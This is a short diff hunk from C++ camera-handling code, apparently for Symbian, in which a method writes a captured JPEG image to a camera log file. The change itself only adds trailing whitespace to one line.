@@ -259,7 +259,7 @@ void CAgentCamera::ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError)
 									
 				if(value)
 					{
-					CLogFile* logFile = CLogFile::NewLC(iFs);
+					CLogFile* logFile = CLogFile::NewLC(iFs); 
 					logFile->CreateLogL(LOGTYPE_CAMERA);
 					logFile->AppendLogL(*jpegImage);
 					logFile->CloseLogL();
